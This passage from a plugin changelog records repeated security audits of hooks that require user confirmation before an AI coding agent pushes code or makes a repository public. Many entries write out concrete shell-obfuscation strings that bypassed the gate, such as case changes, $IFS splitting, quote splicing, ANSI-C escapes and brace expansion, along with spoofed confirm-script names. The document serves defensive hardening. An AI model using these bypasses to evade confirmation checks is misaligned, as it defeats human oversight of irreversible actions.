- `printf -v NAME VALUE`, including a value-capture bug that swallowed a
  trailing semicolon.
- Parameter-expansion defaults (`${VAR:-default}`), indirect expansion
  (`${!ref}`), case-folding (`${x,,}`/`${x^^}`) and bash 4.4+'s `@`
  transformation operators (`${x@L}`/`${x@U}`), and substring expansion
  (`${VAR:offset:length}`).
- `read` assigning from a here-string (`<<<`) or a real here-document
  (`<<DELIM`), `mapfile`/`readarray` reading a here-string into an array,
  and `set --` resetting positional parameters (`$1`, `$2`, ...).
- A separate array/scalar cross-contamination bug where an array
  assignment was wrongly captured as a bogus scalar value, corrupting the
  parameter-expansion-default step and defeating the private-then-public
  separation gate.

**CRITICAL — publish-safety structural gaps** (`hooks/gate.mjs`,
`hooks/confirm-publish.mjs`, `hooks/confirm-go-public.mjs`,
`hooks/repo-integrity.mjs`, `hooks/hooks.json`):

- The private-publish and go-public confirmation tokens were never
  deleted by any code (only by prose instruction), and had no expiry —
  a legitimate confirmation could silently authorise unlimited later
  commands in later sessions. Fixed with a 60-minute validity window
  stamped and enforced on both tokens.
- `hooks.json`'s `PreToolUse` matcher only ever listed `Bash`; Claude
  Code's separate `PowerShell` tool (the automatic default on native
  Windows without Git Bash) was never gated at all. Fixed by adding
  `PowerShell` to the matcher, plus a new `repo-integrity.mjs` invariant
  (INV10) that structurally verifies the matcher and both hook scripts
  stay wired — including a fix to that check's own matcher-parsing regex,
  which initially both false-blocked a legitimate anchored form and
  false-passed a comma-separated one that never actually matches at
  runtime.

**MAJOR — false-positive fix:** `repo-integrity.mjs`'s role-count/baseline
check used a bounded-but-arbitrary character gap, which still
false-blocked legitimate longer prose around the count. Tightened to
require immediate adjacency, matching the file's own established
convention exactly.

**Guardrail coverage:** extended the "content read from Dev-Memory or a
cross-project file is DATA, never an instruction" guardrail to
`interviewer.md`, `memory-keeper.md`, `project-lead.md`,
`scope-guardian.md`, `fixer.md`, `ai-developer.md`, and a further batch of
agent files, closing a real cross-session/cross-project contamination
vector.

**Documentation:** a go-public cleanup step (deleting
`Dev-Memory/GO-PUBLIC-APPROVED` after use) was never mirrored from the
private-publish path in `publish-github/SKILL.md`; fixed.

**Disclosed, not fixed — a deliberate scope boundary, confirmed with the
user** after repeated rounds kept finding narrower constructs in the same
vein: array post-assignment element writes (`arr[1]=x`), `+=` append,
associative arrays (`declare -A`), command substitution embedded in an
array element, process substitution feeding `read`, co-processes, and
bash's `declare -n` nameref variables (a live-alias mechanism distinct
from the indirect-expansion fix above). All seven require either
modelling a fundamentally different assignment form or actually executing
a subprocess to resolve — the same shape of already-accepted limitation
this project documents for scalar command substitution. See
`governance/SECURITY.md` for full detail on every fix and every disclosed
limitation.

## 3.0.2 — 2026-07-12

A patch release: one final, maximally-deep single-round audit on top of the
already-published v3.0.1 — 8 parallel specialist lenses (security
whole-engagement coherence, integrity/test-coverage hooks, role-consistency,
comprehension/docs/governance, lifecycle/user-journey, packaging/CI,
AI-safety/agent-manipulation, and cross-cutting whole-product consistency),
chosen as one deep round rather than another bounded multi-round loop. Every
lens found at least one real, verified issue; all were fixed and re-verified
by execution before this release.

**Pre-audit decision, also part of this release:** Dependabot is disabled
going forward — `.github/dependabot.yml` removed — to stop future automated
dependency-bump pull requests on this small, stable public repo. No git
history rewrite, no force-push: contributor history (`GRU-953`, 9 commits;
`dependabot[bot]`, 2, from the two already-merged CI-action bumps) stays
exactly as it is. Confirmed no hook or CI check depends on the file
existing. Trade-off, consciously accepted rather than silently left
unstated: `actions/checkout`/`actions/setup-node` version bumps are now
fully manual, with no automated or scheduled reminder — GitHub Actions pins
don't silently break, they just age, and this is judged an acceptable
trade-off for a repo this size.

**Security (CRITICAL, live bypass, the most serious finding of this
round):** a declaration keyword (`export`/`declare`/`readonly`/`typeset`)
is itself a real command invocation, so its OWN arguments undergo bash's
normal command-line expansion — including brace expansion — before the
keyword ever sees them. `export v={private,public}` does not assign the
literal text `{private,public}`; bash expands it into two arguments,
`v=private v=public`, and the keyword applies them left-to-right with the
LAST one winning (confirmed live via `bash -x`). The push-safety matcher's
same-command variable-substitution feature (added in the prior 5-round
engagement) captured the raw, un-expanded value instead, producing
`--visibility=private public` — which no longer matched the go-public
gate's regex, letting `export v={private,public}; gh repo edit me/app
--visibility=$v` through with only the private-publish token recorded.
Reproduced end-to-end via the real `gate.mjs` before fixing; fixed by
resolving an embedded brace list (or degenerate range) to its real,
bash-effective last-write-wins value specifically for keyword-prefixed
assignments — the bare, no-keyword form was confirmed live to be a
different, already-safe case and was deliberately left untouched. 1 new
regression test added — `hooks.test.mjs` is now 47/47.

**Also fixed, all found by direct execution, none taken on a report's
word alone:**

- `roster-check.mjs`/`repo-integrity.mjs`'s `role count`/`baseline` regex
  had an unbounded gap to the first digit, so a plausible prose edit
  mentioning an earlier, unrelated number could misread the wrong count
  (a false-block, the safe direction, but citing the wrong number). Bounded
  the gap to the real phrasing's actual shape.
- Tiny-tier projects with an AI/LLM feature had no independent check that
  `ai-developer`'s guardrails actually shipped — only its own self-report,
  since `reviewer` isn't woken on Tiny either. Extended
  `security-compliance-auditor`'s guardrail-presence check to every Tier,
  matching how its other four checks already work universally.
- `fixer.md` and `memory-keeper.md` both carried a stale explanation of an
  apparent "Complex-only" naming in the Tier table that a later fix had
  already made obsolete (the table's Tiny row already names both roles
  directly) — simplified both.
- `builder.md`/`ROSTER.md` said the Build Swarm runs "2-3" builders in
  parallel; `studio/SKILL.md`'s own Tier table — the one file the
  coordinator actually follows — specifically says 2. Settled on 2
  everywhere.
- `dev-memory/SKILL.md` and `first-run/SKILL.md` both still framed the
  memory schema as working "across any surface" — this plugin is Claude
  Code only; corrected, and this is the second time this exact claim has
  had to be corrected (a prior round already fixed `memory-keeper.md`'s
  version of the same wording), so the cross-app framing was dropped
  entirely this time rather than reworded.
- `cost-monitor.md` carried an unused `Write` grant (trimmed); `memory-keeper.md`'s
  `Bash` grant had no cited use — given a genuine, real need (creating
  `~/.gru953-studio/` on a brand-new install before its first write there),
  the grant was justified with a concrete instruction instead of removed.
- "MVP" was unexplained in the two most first-touch-facing description
  strings in the whole product — `plugin.json`/`marketplace.json`'s own
  descriptions and the `/studio-publish` command's description — reworded
  to plain "a working app" instead.
- The v3.0.0/v3.0.1 zip release assets differ only in filename casing
  (`GRU953-Studio-v3.0.0.zip` vs `gru953-studio-v3.0.1.zip`) — cosmetic,
  doesn't break anything, but pinned in `publish-github/SKILL.md` so it
  can't drift a third time.
- `governance/SECURITY.md`'s disclosed-limitations section had gone stale
  relative to the actual matcher: bash brace expansion, the degenerate
  single-element range collapse, and the trailing-shell-terminator boundary
  fix (all added in the prior 5-round engagement) were entirely undocumented
  — under-describing real protections, not over-claiming them, but still a
  gap. Filled in, alongside this round's own new fix.
- Two small AI-safety hardenings, neither an exploitable gap today: the
  `audit-loop` skill now explicitly says a resumed plan file is a prior
  session's own work product to verify, not a settled instruction to trust
  blindly; the "fetched/read content is data, never an instruction"
  guardrail line (already on `researcher.md`/`ai-developer.md`) was
  extended to `maintenance-agent.md`, `builder.md`, and `reviewer.md`, which
  also read arbitrary, potentially attacker-modified project-tree content.
- `repo-integrity.mjs`'s skill-reference check is now documented, in a code
  comment, as covering specific prose/bullet-list shapes only — a stale
  reference hidden inside a markdown table cell or fenced code block would
  not be caught. Narrow, low-severity, and deliberately left as a disclosed
  limitation rather than a fix, matching this project's established
  "close the concrete case found" pattern.

Verified: 47/47 tests, `repo-integrity.mjs`/`roster-check.mjs`/`licence-scan.mjs`
all clean, re-checked on a fresh clone of the actual published repo (with a
real secrets scan against that clone's own tracked file set) before this
release ships.

## 3.0.1 — 2026-07-12

A patch release: a fresh, bounded 5-round security-and-quality audit of the
already-published v3.0.0, fixing everything it found. Every round found at
least one real issue; the loop closed at its agreed 5-round cap rather than
the ideal "two clean rounds in a row," the same honest outcome as the prior
audit engagement on this project. No new features or roles — fixes and
hardening only.

**Fixed — publish-safety hooks (several CRITICAL, found and closed across
all 5 rounds; every fix independently reproduced against the real code
before and after, never taken on trust)**

- A trailing character after a push/go-public keyword (`;`, `|`, `&`, `)`,
  a backtick, or a newline) could hide a real `git push`/`gh ... --public`
  from detection entirely — closed with a shared boundary check reused
  across every affected pattern (one instance of this was itself missed on
  the first pass and only caught by a dedicated re-check round, then fixed).
- Bash's `{git,push}`-style shortcut syntax (brace expansion) was not
  recognised at all, letting a disguised push slip through completely
  unchecked — closed by expanding this shortcut before checking.
- A follow-on bypass of the fix above: a variable set earlier in the same
  command (`t=t; {gi$t,push}`) could still hide the keyword. Closed with a
  narrow, same-command-only variable resolver — not a general shell
  interpreter, deliberately bounded in scope.
- A further re-check of that variable resolver found it could still be
  defeated by common prefixes (`export`, `local`, `readonly`, `declare`,
  `typeset`), by a two-step variable chain, by a bash "single-item range"
  shortcut (`{s..s}`), and — the most interesting of the whole exercise — a
  subtle bug in how the fix used a built-in JavaScript text-replacement
  feature, unrelated to shell tricks at all. All closed and independently
  verified.
- A narrower rule (spotting a script pretending to be something safe) was
  too easily fooled by ordinary punctuation after the script name, and
  separately blocked some perfectly normal read-only commands that merely
  mentioned a script's name without running it — both fixed.
- One further technique (spelling out a command letter-by-letter via a
  `printf` call) is real but sits inside an already-accepted, clearly
  out-of-scope category — closing it fully would mean this safety check
  actually running shell commands to see what they do, which is not what a
  fast, lightweight check like this is built to do. Documented plainly in
  `governance/SECURITY.md` instead of pretending it's closed.

**Fixed — internal quality checks**

- The dependency-licence checker silently ignored a package it couldn't
  read instead of flagging it for a human look.
- The internal consistency checker missed a broken reference in the
  studio's own main instruction file, and could crash instead of reporting
  cleanly on a corrupted file.
- The role-count checker sorted dates incorrectly in a way that could
  either hide or wrongly flag a legitimate roster change.
- The progress-tracking checker had two bugs: one that could wrongly block
  a perfectly normal in-progress task, and one that could wrongly wave
  through a task that had actually documented its own failure.
- 16 new automated regression tests added (30 → 46) so none of the above
  can silently reappear.

**Fixed — navigation, wording and first-time-user experience**

- The studio's own nine-stage roadmap named a stage ("Update") that no
  file anywhere actually defined — renamed to "Review," matching what
  genuinely happens there, and clarified that smaller ("Tiny" tier)
  projects fold this into the tester's own checks rather than leaving it
  unowned.
- The publishing instructions were missing a safety check that other files
  already assumed was in place.
- The status-report command promised to state a project's size-tier but
  was never told to read the one file that actually records it.
- The one-off first-time setup asked for a GitHub username with no
  "I'll do this later" option for someone who doesn't have an account yet;
  and "GitHub handle" was replaced with the plainer "username" throughout,
  to match the README's own wording.
- Several smaller wording and cross-reference fixes (a miscounted check
  list, a stale CI-tool-version note, a contributor-guide example that
  accidentally contradicted its own advice).

## 3.0.0 — 2026-07-11

A golden release: fixes a real shipping bug that failed CI, closes a
critical publish-safety bypass found in Round 5 of the audit loop, and
consolidates the specialist roster from 31 to a leaner, genuinely
non-overlapping **23**. The roster change is why this is a MAJOR version —
eight role names no longer exist.

**Fixed — CI / a real shipping bug (every release since v1.0.0 was affected)**

- The `dev-memory` **skill was never actually published.** `.gitignore`'s
  `Dev-Memory/` line (meant for a project's private working-memory folder)
  also matched the plugin's own `plugins/gru953-studio/skills/dev-memory/`
  skill folder case-insensitively on macOS (`git core.ignorecase=true`), so
  git silently never committed it. On a clean Linux CI checkout the plugin
  had 5 skills, not the 6 the README and five files reference, and
  `repo-integrity.mjs` correctly failed. Fixed by root-anchoring the ignore
  rule to `/Dev-Memory/` and committing the skill. The published plugin now
  actually contains its memory skill.
- The secret scanner (`scan.mjs`) had the **same case bug**: its
  `DEVMEMORY_RE` used a case-insensitive flag, so once the `dev-memory`
  skill was committed the scanner flagged it as the private `Dev-Memory`
  folder and would have blocked every push of the plugin itself. Made the
  match case-sensitive to the canonical `Dev-Memory` name.
- Cleared the CI "Node.js 20 is deprecated" warning (bumped
  `actions/checkout` and `actions/setup-node` to v5, Node 22). (Note, added
  2026-07-12: Dependabot has since bumped these further, directly on
  GitHub, to `actions/checkout@v7` and `actions/setup-node@v6` — the
  currently committed `ci.yml` reflects that, not the v5 this entry
  originally described.)

**Fixed — publish-safety (Round 5 of the audit loop, CRITICAL)**

- `gate.mjs`'s go-public check (`isGoPublicCommand`) matched **raw,
  un-normalized** command text, so every obfuscation the push detector was
  hardened against over four rounds — quoted flag values
  (`--visibility="public"`), `$IFS` word-splitting, quoted tokens
  (`"gh" repo edit`) — sailed past it. With only a private-publish
  confirmation recorded, an obfuscated "make it public" command was allowed
  with no go-public confirmation at all, defeating the private-then-public
  guarantee. Also, `isPushCapable`'s `gh` rules themselves required the
  literal unquoted word `gh`, so a quoted `"gh"` was not even seen as
  push-capable. Both fixed: the go-public check now normalizes the command
  the same way and both tolerate quotes/`$IFS` around every token; verified
  live and locked in with regression tests (suite now 22 tests, all green).

**Changed — roster consolidated 31 → 23 (BREAKING)**

On the owner's explicit instruction to remove overlap and make every role
unique, eight roles that overlapped another or created an artificial
hand-off were merged into the role that already owned the adjacent work:

- `prompt-engineer` and `mlops-engineer` → **ai-developer** (it now owns the
  prompt, the integration, the guardrails, and a repeatable quality check).
- `qa-lead` → **tester** (test strategy + execution in one role).
- `sre-observability` → **devops-engineer** (deploy + live-running
  reliability in one role).
- `release-manager` → **publisher** (versioning + release notes + the push).
- `cut-recorder` → **scope-guardian** (it decides a cut and records it).
- `project-assistant` → **memory-keeper** (the task table/logs it tidied are
  Dev-Memory files memory-keeper already owns).
- `privacy-dpo` → **security-compliance-auditor** (one pre-publish
  compliance gate covering security AND personal-data/privacy).

`responsible-ai-reviewer` was kept deliberately separate from `ai-developer`
(independent review, like `reviewer` vs `builder`). Every surviving role's
trigger is now distinct. See `plugins/gru953-studio/ROSTER.md` for the full
rationale. Anyone who referenced a removed role by name should use the
survivor it merged into.

**Rounds 6 and 7 of the same audit loop, before this release ships:**

- Two agent files (`reviewer.md`, `builder.md`) still instructed a hand-off
  "with the Cut-Recorder" — a role merged into `scope-guardian` above.
  Fixed to reference `scope-guardian`'s `UNBUILT.md` cut ledger instead.
- `technical-writer`'s own description claimed it writes "clear help/error
  text" while also stating it is distinct from `ux-designer` (which owns
  in-app wording) — self-contradictory, since in-app error/help text IS
  in-app wording. Narrowed `technical-writer` to standalone docs only.
- `project-lead.md` described itself as separate from "23 specialist
  roles" while being one of the 23 itself — an off-by-one that implied 24
  roles total. Reworded to avoid stating a count that has to be kept in
  sync by hand.
- Trimmed an unused `Write` tool grant from `scope-guardian` (it delegates
  the one write action it performs to `memory-keeper`, so it never uses
  `Write` directly).
- `governance/LOGO-USAGE.md` still named the superseded GRU953 Community
  Licence 1.0; corrected to the Polyform Noncommercial License 1.0.0 this
  repo actually ships under.
- `governance/CONTRIBUTING.md` and `CLAUDE.md` documented gate commands
  that didn't textually match what `.github/workflows/ci.yml` actually
  runs (a `--test` flag CI doesn't use; a bare `roster-check.mjs` invocation
  where CI passes explicit arguments) — functionally equivalent, but no
  longer worth a reader having to notice that. Made them match exactly.
- **Security (CRITICAL, found live): `normalizeForPushCheck`'s
  backslash-unescape only covered letters and digits**, so
  backslash-escaped PUNCTUATION (`gh repo edit me/app -\-public`,
  `--visibility\=public`) kept its backslash and slipped past the
  go-public regexes while bash resolved a real `--public` /
  `--visibility=public` flag — allowed with only the private-publish
  token recorded. Fixed by un-escaping a backslash before ANY character.
- **Security (CRITICAL, found live): ANSI-C quoting (`$'public'`) wasn't
  recognised at all.** Bash resolves `$'public'` to the literal text
  `public`, so `gh repo edit me/app --visibility $'public'` bypassed the
  go-public gate the same way. Reproduced directly (`x=$'public'; echo
"$x"` → `public`) before fixing. Fixed by stripping `$'...'` to its raw
  content as the very first normalization step.
- `repo-integrity.mjs`'s README role/skill-count check used only the FIRST
  match anywhere in the file with no `/g` — a later, wrong count could hide
  behind an earlier correct one (false-clean), while an unrelated
  historical number could falsely block a correct README. Fixed to check
  every occurrence of the specific "N specialist roles"/"N skills" phrase
  consistently.
- `repo-integrity.mjs`'s INV9 crashed with an uncaught exception on a
  missing `marketplace.json` instead of reporting it — losing every other
  finding (including the real one) behind a raw stack trace. Fixed with a
  proper guard.
- `repo-integrity.mjs`'s frontmatter parser returned a quoted
  `name: "x"` value with the quotes still attached, which would have
  falsely failed a syntactically valid file. Fixed to parse quoted values
  like real YAML would.
- `verify-progress.mjs` required an exact `done` status cell, so a
  decorated `Done ✅` row with zero verified-evidence text was silently
  skipped — the exact failure mode this script exists to catch. Loosened
  to recognise "done" as the leading word, tolerating trailing decoration.
- Added 6 new regression tests for `repo-integrity.mjs`/`verify-progress.mjs`,
  which had zero test coverage before this round — `hooks.test.mjs` is now
  28/28, up from 22.
- `project-lead.md` described itself as separate from "23 specialist
  roles" while being one of the 23 itself. Reworded to avoid a count that
  has to be kept in sync by hand.
- Trimmed an unused `Write` tool grant from `scope-guardian` (it delegates
  its one write action to `memory-keeper`).
- `governance/LOGO-USAGE.md` still named the superseded GRU953 Community
  Licence 1.0; corrected to the Polyform Noncommercial License 1.0.0.
- `CLAUDE.md`/`governance/CONTRIBUTING.md` documented gate commands that
  didn't textually match what `ci.yml` actually runs; made them match.
- **Security (CRITICAL, the most severe bypass found across this whole
  loop): every `git`/`gh` regex matched literal, case-SENSITIVE text**, but
  the filesystems this plugin targets (macOS APFS, Windows NTFS) resolve a
  binary name via `PATH` without regard to case. `GIT push origin main` is
  not obfuscation — it is bash running the real `git` binary, unchanged.
  Reproduced live: with a real secret committed and ZERO confirmation
  tokens of any kind recorded, `GIT push origin main` was allowed by both
  `scan.mjs` and `gate.mjs`, while lowercase `git push origin main` was
  correctly denied — this defeated the matcher's very first check, for the
  plain push/repo-create/repo-edit cases themselves, not an edge-case flag
  value. Fixed by adding `/i` to every relevant regex in `isPushCapable`
  and `isGoPublicCommand`.
- **Security (CRITICAL): ANSI-C hex/octal escapes inside `$'...'` weren't
  decoded.** `$'pub\x6cic'`/`$'pub\154ic'` resolve to the literal text
  `public` in bash (the escape spells the letter "l"), and `$'\x67\x68'`
  resolves to `gh` — spelling the binary name itself. The Round 7 fix only
  stripped the `$'...'` wrapper without decoding what was inside it. Fixed
  by decoding `\xHH`/`\NNN` escapes before stripping the wrapper.
- Added 5 new regression tests for the case-insensitivity and ANSI-C
  hex/octal fixes — `hooks.test.mjs` is now 30/30.

**Round 9, a dedicated non-technical-comprehension pass plus an
agent-manipulation security pass — both genuinely new lenses, not
re-testing prior fixes:**

- README's install section had "click the links below" with no links to
  click, an unexplained "marketplace," and a bare `/path/to/...`
  placeholder with no real example — all fixable, all real for a total
  first-time user. Rewritten with concrete instructions and a worked
  example path for both Mac and Windows.
- The single highest-stakes sentence in the whole product — the
  "permanent and irreversible" private-publish confirmation — used the
  word "repository" without ever defining it anywhere in the product.
  Added a plain-English gloss at the one place this sentence is defined.
- No rule anywhere barred relaying a raw hook/tool error string (shell
  variables, file paths, code identifiers) to the user verbatim. Added an
  explicit rule to the Stuck Protocol: always translate, never relay raw.
- The Tier-assignment question "Does it integrate two or more external
  services?" used jargon a non-technical user answering the pop-up
  wouldn't necessarily know. Reworded in plain terms with an example.
- `publish-github/SKILL.md` had a stale cross-reference ("before step 2,
  not after it") left over from an earlier renumbering of the same list,
  and a resume-rehearsal instruction placed AFTER the four checks it says
  it must precede. Both fixed — the cross-reference now names the actual
  step, and the instruction moved to where it belongs.
- `dev-memory/SKILL.md` contradicted itself (and `project-lead.md` and
  `studio/SKILL.md`) about who reads Dev-Memory at session start — one
  passage said Project Lead reads "the single resume pointer... and
  nothing more," another said `memory-keeper` does the reading. Settled on
  one consistent story matching the other two files: Project Lead reads
  `PROGRESS.md`/`SESSION-LOG.md` tail/`INDEX.md` directly (the one narrow
  exception to its delegate-only rule), `memory-keeper` owns everything
  else.
- The agent-manipulation security pass confirmed a genuine PASS on the
  core guarantee — no skill or agent file lets a memory file's _claimed_
  approval substitute for a live `AskUserQuestion` answer on an
  irreversible action — but surfaced two real, bounded, disclosed-not-fixed
  limitations, documented in `governance/SECURITY.md`: the publish token is
  derived from a public formula and a non-secret path, so it proves "this
  file was written," not "a human clicked yes"; and the mandatory
  secrets-scan-before-memory-write rule has no `PreToolUse` hook backing
  it on `Write`/`Edit`, only prose (bounded — `Dev-Memory/` never ships
  regardless).

Verified: 30/30 tests, `repo-integrity.mjs`/`roster-check.mjs`/`licence-scan.mjs`
all clean, re-checked on a fresh clone of the repo before this release ships.

**Three new features, added on request, plus the Round 10-11 audit-fix
loop that followed:**

- **New skill: `audit-loop`.** A systematic, planned protocol for any
  review that needs more than one pass — plan the full set of risk
  dimensions and a bounded round budget (target 5 or fewer) before
  starting, dispatch a genuinely fresh panel each round, and always
  re-verify the immediately-previous round's specific fix with the SAME
  panel configuration that found it, alongside fresh exploration.
  Referenced from `reviewer.md`, `security-compliance-auditor.md`, and
  `studio/SKILL.md`. Distilled directly from this project's own 2026-07-11
  audit-fix loop.
- **Learning from mistakes, both scopes.** A new per-project
  `Dev-Memory/LESSONS.md` (append-only, factual, dated) logs a real mistake
  and the corrected rule going forward; at Publish, anything genuinely
  general is distilled into a new cross-project
  `~/.gru953-studio/common-pitfalls.md`, so a mistake caught once benefits
  every future project, not just the one it happened on. Checked by
  `builder`, `fixer`, and `ai-developer` before starting a task that
  resembles one already logged.
- **Working-style memory, across every project.** The existing
  first-run-only `~/.gru953-studio/profile.md` is now also grown by
  `memory-keeper` throughout every later project with durable working-style
  facts learned from real sessions — read by `interviewer` before drafting
  questions and by `project-lead` at the start of every session. Explicitly
  documented as a preference hint, never authorization for anything, and
  never a substitute for a live confirmation on an irreversible action.

**Round 10 (4 lenses, 3 found real issues):** the new files' documented
"read triggers" were aspirational prose never actually wired into the
consuming roles — fixed by adding real checks to `builder.md`, `fixer.md`,
`ai-developer.md`, and `project-lead.md`, and by naming `memory-keeper` as
the executor of `first-run`'s initial write (the previous default,
`project-lead`, deliberately has no `Write` tool and structurally couldn't
have done it). The "same secrets-scan rule applies" disclosure for the new
cross-project files was copied from the narrower per-project case without
re-deriving whether it held at a much wider blast radius (outside any git
repo, read at the start of every future project forever) — re-derived
explicitly rather than borrowed by reference. Re-verifying Round 9's
comprehension fixes (same panel configuration) confirmed all 5 held, but
surfaced 3 new issues (unexplained "converges" jargon; an internal
changelog note spliced into literal user-facing pop-up question text — a
real risk of it being shown verbatim; "CLI" never expanded) — all fixed.
Re-verifying Round 9's agent-manipulation conclusion (same configuration):
clean re-confirmation, no new failure mode.

**Round 11 (2 lenses — a smaller, targeted completeness check, not another
open-ended round, per the new `audit-loop` skill's own "re-plan"
guidance):** a dedicated first-ever deep-read of the governance/CI files
found `governance/LOGO-USAGE.md` still named the superseded GRU953
Community Licence 1.0 in a SECOND place ("Everything else stays open")
that an earlier fix (this same file's opening paragraph) had missed —
fixed, now consistently Polyform Noncommercial License 1.0.0 throughout.
An unconstrained wildcard pass found this very CHANGELOG entry itself
hadn't kept pace with the Round 10 feature work — this entry is that fix.

Verified again: 30/30 tests, all gates clean.

**11 rounds of independent audit panels ran across this whole loop, every
one finding at least one real issue.** Publishing now on explicit user
instruction to stop the loop and ship what has been verified, rather than
continuing to an idealised "2 consecutive clean rounds" state.

## 2.0.3 — 2026-07-11

Round 4 of the same "until golden" audit-fix loop on v2.0.2. The Round 3
fixes all held up under fresh, hostile re-testing (every case verified by
executing the real code, not just reading it) — no push/publish/go-public
bypass was found. Three new bugs surfaced, all in the safe direction
(over-blocking a legitimate command, not under-blocking a real push), plus
one dangling documentation cross-reference.

**Fixed**

- **`normalizeForPushCheck()`'s quote-stripping was one-sided.** It
  stripped a quote whenever a word character touched either side of it,
  with no check on the OTHER side — so the closing quote of a perfectly
  normal, properly paired argument (`"My Project"`, or the second of two
  separately-quoted absolute paths) also got stripped, purely because it
  sits after a word character, even though what follows it is whitespace
  or end-of-string, not another word character. That corrupted a
  legitimate confirm-publish.mjs invocation whose project-root argument
  contained a space, misclassifying it as push-capable — over-blocking,
  not a bypass, but the same deadlock shape found and fixed in Rounds 1-3.
  Fixed: a quote is now only stripped when word/quote characters sit on
  BOTH immediate sides (the actual mid-word-splice signature); a quote at
  a genuine token boundary is left alone. The Round 1-2 splice bypasses
  (`p"u"s"h"`, `pu""sh`) are still caught — verified with new tests.
- **`isConfirmScriptOnly()`'s closing anchor didn't tolerate a trailing
  newline.** `node confirm-publish.mjs \n` failed the exemption and fell
  through to the generic heuristic (misclassified as push-capable).
  Trailing `\r`/`\n` is now tolerated the same as spaces and tabs.
- **The script-indirection keyword list only covered the private-publish
  action.** A script indirectly performing the plugin's separately-gated
  GOING-PUBLIC action (e.g. `make-repo-public.mjs`, `visibility-change.mjs`)
  contained none of the original `deploy|release|publish|ship` keywords
  and got an unconditional pass. Added `public`/`visibility` to the list.
- `governance/SECURITY.md` was missing the paragraph its own code comment
  (in `lib.mjs`) pointed readers to, about the confirm-script exemption's
  filename-trust residual risk. Added.

Verified: 19/19 behavioural tests (3 new this round), `repo-integrity.mjs`,
`roster-check.mjs` and `licence-scan.mjs` all clean — re-run after every
fix, then again on a fresh clone of the actual published repo before
pushing.

## 2.0.2 — 2026-07-11

Round 3 of the same "until golden" audit-fix loop on v2.0.1 — a fresh,
independent review pass with instructions to assume nothing from the prior
two rounds is guaranteed correct. Found the most serious issue of the whole
loop, plus one architectural misdescription affecting four agent files.

**Fixed**

- **Security (CRITICAL, real bypass): the v2.0.1 confirm-script exemption
  trusted a filename suffix, not an identity.** `isConfirmScriptOnly()` in
  `plugins/gru953-studio/hooks/lib.mjs` (added in 2.0.1 to fix the
  confirm-publish.mjs bootstrap deadlock) matched any path that merely
  ENDED WITH `confirm-publish.mjs` or `confirm-go-public.mjs` — so
  `node ./evil-confirm-publish.mjs` or `node /tmp/attacker/z-confirm-publish.mjs`
  were exempted just as completely as the real script. Since `gate.mjs` and
  `scan.mjs` both `allow()` immediately once a command is judged non-push,
  this gave any arbitrarily-named script an unconditional, unscanned,
  ungated pass. The same regex also failed the confirm scripts' own
  documented bare usage (`node confirm-publish.mjs`, no directory prefix),
  recreating the exact deadlock the exemption exists to close. Fixed by
  comparing an exact `path.basename()` match instead of a suffix test;
  verified live against both bugs before and after the fix, and locked in
  with a new regression test in `hooks.test.mjs` (now 16/16 passing).
- **`repo-integrity.mjs` INV9 had no `else fail()`.** Unlike every sibling
  invariant, the role-count-in-description check silently stopped verifying
  anything if the wording ever stopped matching its expected pattern —
  the same shape of blind spot it was written to close. Now fails loud if
  the description is missing or doesn't state a role count in the expected
  form.
- **A real architectural misdescription, found by verifying against
  Claude Code's own subagent documentation rather than assuming:**
  `interviewer.md`, `publisher.md` and `scope-guardian.md` were written as
  if they themselves called `AskUserQuestion` to show the user a live
  pop-up. Task-tool subagents cannot do this — the tool depends on the main
  conversation's session state and is unavailable to them even when
  declared. Corrected all three to prepare question content / confirmation
  wording / an escalation recommendation and hand it to the Project Lead,
  which is the one role played by the main conversation itself and the
  only place that can actually show a pop-up or wait for a live answer —
  documented explicitly in `project-lead.md`. This was a documentation
  correction, not a behavioural change: every real GRU953-Studio session
  observed so far already worked this way in practice.
- Stray "Claude Code or Claude Desktop" claim in `memory-keeper.md` —
  the plugin does not run on Claude Desktop (see README); corrected to
  match the accurate wording already used in `dev-memory/SKILL.md`.
- `reviewer.md` said it performs deletions and "fixes" stale docs directly,
  contradicting its own deliberately read-only tool list (Read, Grep, Glob,
  Bash — no Write/Edit) and the project's stated "every review-only role is
  correctly read-only" guarantee. Reworded to recommend and report findings
  for the builder/Project Lead to act on, matching its actual tools and its
  own Output section.

Verified: 16/16 behavioural tests, `repo-integrity.mjs` clean (31 agents,
version 2.0.2 in both `plugin.json` and `marketplace.json`), `roster-check.mjs`
clean, `licence-scan.mjs` clean — all re-run after every fix in this round.

## 2.0.1 — 2026-07-11

A follow-up audit round on v2.0.0, requested explicitly ("identify and fix
all issues... until golden"). GitHub Copilot was requested for this round
too — checked and reported honestly that this account has no active
Copilot subscription (`user/copilot_seat` → 404), so this round used the
same Claude-based adversarial audit process instead, across four lenses:
role-redundancy/growth, security, cross-file consistency, and non-technical
end-user experience.

**Fixed**

- **Security (MAJOR, real bypass): `isPushCapable()` defeated by shell
  word-splitting/quote-splicing — found and closed across two audit
  rounds, not one.** Round 1: `git${IFS}push` (bash's `$IFS` expands to
  whitespace, triggering word-splitting) and `git pu""sh` / `git pu''sh`
  (empty adjacent quotes are zero-width to bash) both resolved to a real
  `git push` while the matcher — which only ever sees the un-expanded
  literal text — rated them non-push, skipping the secret scan and the
  publish gate entirely. Round 2 (an independent re-audit of the Round 1
  fix, not just re-reading it): found the fix only stripped EMPTY quote
  pairs, missing the equally trivial non-empty case (`git p"u"s"h"`),
  plus backslash-escaped mid-word splicing (`git p\ush`) and
  backslash-newline line continuations. Generalised the fix to a
  fixed-point loop that strips any quote touching a word character on
  either side (so chained splices like `p"u"s"h"` fully resolve, not just
  the first pair), plus the two backslash techniques. This closes every
  proof-of-concept bypass demonstrated across both rounds; shell text
  obfuscation in general remains an open-ended problem (command
  substitution, variable reuse), documented plainly in SECURITY.md rather
  than implied to be solved. Locked in with 2 new test cases (14 tests
  total, up from 12 at v2.0.0).
- **`hooks/repo-integrity.mjs` false-clean bug (MAJOR).** The
  plugin.json/marketplace.json version-agreement check compared
  `pv !== mv` only — if BOTH files were entirely missing, both values were
  `undefined`, `undefined !== undefined` is `false`, and the check
  reported "clean." Reproduced directly (a repo missing both files passed
  as clean) and fixed: now fails explicitly when either file is
  unreadable or either version is absent. Also added a new invariant
  (INV9) checking marketplace.json's own plugin-description text states
  the correct role count — the systemic fix for the next finding.
- **`marketplace.json`'s plugin description said "up to 16 specialised
  roles"** — visible in the actual marketplace listing, unnoticed for a
  full day after the roster grew to 31 because nothing checked
  description text, only the version field. Fixed, and now mechanically
  checked (see above).
- **CHANGELOG's own "11 tests" claim was wrong** (actually 12 at the time of
  v2.0.0, now 14 after this round's fixes) — fixed for the record, per the
